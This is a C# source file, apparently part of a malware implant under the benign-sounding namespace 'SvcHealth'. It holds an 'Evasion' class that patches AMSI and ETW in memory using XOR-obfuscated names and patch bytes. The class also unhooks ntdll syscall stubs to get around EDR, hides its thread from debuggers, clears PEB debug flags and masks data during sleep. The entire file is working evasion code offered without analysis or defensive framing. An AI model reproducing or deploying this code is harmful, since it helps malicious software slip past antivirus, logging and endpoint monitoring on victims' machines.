using System;
using System.IO;
using System.Runtime.ExceptionServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace SvcHealth
{
    static class Evasion
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("ntdll.dll")]
        static extern int NtSetInformationThread(IntPtr hThread, int ThreadInformationClass, IntPtr ThreadInformation, int ThreadInformationLength);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const int ThreadHideFromDebugger = 0x11;

        [HandleProcessCorruptedStateExceptions]
        public static void Run()
        {
            if (Environment.OSVersion.Platform != PlatformID.Win32NT) return;
            try { HideThread(); } catch { }
            try { PatchDebugFlags(); } catch { }
            try { PatchEtw(); } catch { }
        }

        static bool PatchAmsi()
        {
            string lib1 = new string(new char[] { 'a','m','s','i' });
            IntPtr lib = GetModuleHandle(lib1 + ".dll");
            if (lib == IntPtr.Zero) return false;
            byte[] nb = { 0x84, 0xA8, 0xB6, 0xAC, 0x96, 0xA6, 0xA4, 0xAB, 0x87, 0xB0, 0xA3, 0xA3, 0xA0, 0xB7 };
            char[] nc = new char[nb.Length];
            for (int i = 0; i < nb.Length; i++) nc[i] = (char)(nb[i] ^ 0xC5);
            IntPtr addr = GetProcAddress(lib, new string(nc));
            if (addr == IntPtr.Zero) return false;
            byte[] xp = { 0x4D, 0xA2, 0xF5, 0xF2, 0x75, 0x36 };
            byte[] patch = new byte[xp.Length];
            for (int i = 0; i < xp.Length; i++) patch[i] = (byte)(xp[i] ^ 0xF5);
            uint old;
            VirtualProtect(addr, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out old);
            Marshal.Copy(patch, 0, addr, patch.Length);
            VirtualProtect(addr, (UIntPtr)patch.Length, old, out old);
            return true;
        }

        static bool PatchEtw()
        {
            IntPtr ntdll = GetModuleHandle("ntdll.dll");
            if (ntdll == IntPtr.Zero) return false;
            byte[] eb = { 0x80, 0xB1, 0xB2, 0x80, 0xB3, 0xA0, 0xAB, 0xB1, 0x92, 0xB7, 0xAC, 0xB1, 0xA0 };
            char[] ec = new char[eb.Length];
            for (int i = 0; i < eb.Length; i++) ec[i] = (char)(eb[i] ^ 0xC5);
            IntPtr addr = GetProcAddress(ntdll, new string(ec));
            if (addr == IntPtr.Zero) return false;
            byte[] xpe = { 0xC6, 0x35, 0x36 };
            byte[] patch = new byte[xpe.Length];
            for (int i = 0; i < xpe.Length; i++) patch[i] = (byte)(xpe[i] ^ 0xF5);
            uint old;
            VirtualProtect(addr, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out old);
            Marshal.Copy(patch, 0, addr, patch.Length);
            VirtualProtect(addr, (UIntPtr)patch.Length, old, out old);
            return true;
        }

        static bool UnhookNtdll()
        {
            string path = Path.Combine(Environment.SystemDirectory, "ntdll.dll");
            if (!File.Exists(path)) return false;
            byte[] clean = File.ReadAllBytes(path);
            IntPtr ntdll = GetModuleHandle("ntdll.dll");
            if (ntdll == IntPtr.Zero) return false;

            int e_lfanew = Marshal.ReadInt32(ntdll, 0x3C);
            IntPtr fileHeader = new IntPtr(ntdll.ToInt64() + e_lfanew + 4);
            int sizeOfOptionalHeader = Marshal.ReadInt16(fileHeader, 16);
            IntPtr sectionHeaders = new IntPtr(fileHeader.ToInt64() + 20 + sizeOfOptionalHeader);
            short numSections = Marshal.ReadInt16(fileHeader, 2);
            int textRva = 0, textRaw = 0, textSize = 0;
            for (int i = 0; i < numSections; i++)
            {
                IntPtr sec = new IntPtr(sectionHeaders.ToInt64() + i * 40);
                byte[] nameBytes = new byte[8];
                Marshal.Copy(sec, nameBytes, 0, 8);
                if (Encoding.ASCII.GetString(nameBytes).TrimEnd('\0') == ".text")
                {
                    textSize = Marshal.ReadInt32(sec, 8);
                    textRva = Marshal.ReadInt32(sec, 12);
                    textRaw = Marshal.ReadInt32(sec, 20);
                    break;
                }
            }
            if (textRaw == 0 || textRaw + textSize > clean.Length) return false;

            string[] targets = {
                "NtCreateFile", "NtWriteVirtualMemory", "NtAllocateVirtualMemory",
                "NtProtectVirtualMemory", "NtMapViewOfSection", "NtCreateThreadEx",
                "NtQueueApcThread", "NtCreateSection", "NtOpenProcess"
            };
            int restored = 0;
            foreach (string fn in targets)
            {
                IntPtr addr = GetProcAddress(ntdll, fn);
                if (addr == IntPtr.Zero) continue;
                long offset = addr.ToInt64() - ntdll.ToInt64();
                if (offset < textRva || offset >= textRva + textSize) continue;
                int fileOff = textRaw + (int)(offset - textRva);
                if (fileOff + 32 > clean.Length) continue;
                uint old;
                VirtualProtect(addr, (UIntPtr)32, PAGE_EXECUTE_READWRITE, out old);
                Marshal.Copy(clean, fileOff, addr, 32);
                VirtualProtect(addr, (UIntPtr)32, old, out old);
                restored++;
            }
            return restored > 0;
        }

        static void HideThread()
        {
            NtSetInformationThread(new IntPtr(-2), ThreadHideFromDebugger, IntPtr.Zero, 0);
        }

        static void PatchDebugFlags()
        {
            IntPtr pbi = Marshal.AllocHGlobal(48);
            try
            {
                int sz = 0;
                int status = NtQueryInformationProcess(GetCurrentProcess(), 0, pbi, 48, ref sz);
                if (status != 0) return;
                IntPtr peb = Marshal.ReadIntPtr(pbi, IntPtr.Size);
                if (peb == IntPtr.Zero) return;
                Marshal.WriteByte(peb, 2, 0);
                int flagOffset = IntPtr.Size == 8 ? 0xBC : 0x68;
                int flags = Marshal.ReadInt32(peb, flagOffset);
                if ((flags & 0x70) != 0)
                    Marshal.WriteInt32(peb, flagOffset, flags & ~0x70);
            }
            finally { Marshal.FreeHGlobal(pbi); }
        }

        [DllImport("ntdll.dll")]
        static extern int NtQueryInformationProcess(IntPtr hProcess, int processInfoClass, IntPtr pbi, int size, ref int returnLength);

        public static void SleepMask(int ms, byte[] sensitiveData)
        {
            if (sensitiveData == null || sensitiveData.Length == 0)
            {
                Thread.Sleep(ms);
                return;
            }
            byte[] key = new byte[32];
            using (var rng = new System.Security.Cryptography.RNGCryptoServiceProvider())
            {
                rng.GetBytes(key);
            }
            for (int i = 0; i < sensitiveData.Length; i++)
                sensitiveData[i] ^= key[i & 31];
            Thread.Sleep(ms);
            for (int i = 0; i < sensitiveData.Length; i++)
                sensitiveData[i] ^= key[i & 31];
            Array.Clear(key, 0, key.Length);
        }
    }
}
